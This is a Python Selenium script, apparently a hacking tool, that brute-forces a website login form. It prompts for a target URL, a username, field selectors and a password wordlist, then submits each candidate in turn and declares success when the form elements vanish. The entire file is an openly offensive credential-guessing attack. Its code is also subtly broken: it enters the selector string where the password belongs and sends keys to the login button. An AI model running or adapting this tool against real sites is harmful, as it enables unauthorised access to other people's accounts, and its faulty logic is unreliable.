import selenium
from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException
import time
import requests

CHROME_PATH = 'C:/browser/chromedriver.exe'


class color:
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
    CWHITE = '\33[37m'


def main():
    print_help_messages()
    init_brute_force_attack()


def print_help_messages():
    print('\n')
    print('You will need to copy the selector of name, password and login ' +
          'form.')
    print('After that, just specify the password list to brute force.')
    print('\n')
    print(' ====================== Copying selector of forms ======================')
    print('1. Right click on the component -> Inspect element')
    print('2. Click on the three dots on the superior left corner of the element')
    print('3. Copy -> Copy selector')
    print('\n')


def init_brute_force_attack():
    website = input('Insert the website url: ')
    print('Checking website...')
    if is_valid_website(website):
        username = input('Insert the username for brute-force: ')

        username_selector = input('Insert the username selector: ')
        password_selector = input('Insert the password selector: ')
        login_button_selector = input('Insert the login button selector: ')

        password_list = input('Insert the wordlist location: ')

        brute_force(
            website,
            username,
            username_selector,
            password_selector,
            login_button_selector,
            password_list,
        )


def is_valid_website(website):
    valid_website = False
    try:
        request = requests.get(website)
        if request.status_code == 200:
            valid_website = True
            print('OK')
        else:
            print('Looks like an invalid website. Dont forget "http" or "https"' +
                  ' in your URL.')
            return init_brute_force_attack()

    except:
        print('Ops. I didnt find this website in anywhere... Dont forget "http" or "https" in your URL.')
        return init_brute_force_attack()

    return valid_website


def brute_force(website, username, name_selector, password_selector, login_button_selector, password_list):
    passwords = open(password_list, 'r')
    browser = webdriver.Chrome(CHROME_PATH)
    while True:
        try:
            for force_password in passwords:
                browser.get(website)

                time.sleep(2)

                name = browser.find_element_by_css_selector(name_selector)
                password = browser.find_element_by_css_selector(
                    password_selector)
                button = browser.find_element_by_css_selector(
                    login_button_selector)

                name.send_keys(username)
                password.send_keys(password_selector)
                button.send_keys(login_button_selector)

                time.sleep(4)

                print_tried_password(username, force_password)
        except KeyboardInterrupt:  # user canceled operation with CTRL + C
            # TODO: stop for block and return later
            exit()
        except selenium.common.exceptions.NoSuchElementException:
            print_password_found(force_password)
            exit()


def print_tried_password(user, password):
    print('=========================================================')
    print('Tried password "' + password + '" for user ' + user + '.')
    print('=========================================================')


def print_password_found(password):
    print('Password has been found: ' + password)


if __name__ == '__main__':
    main()
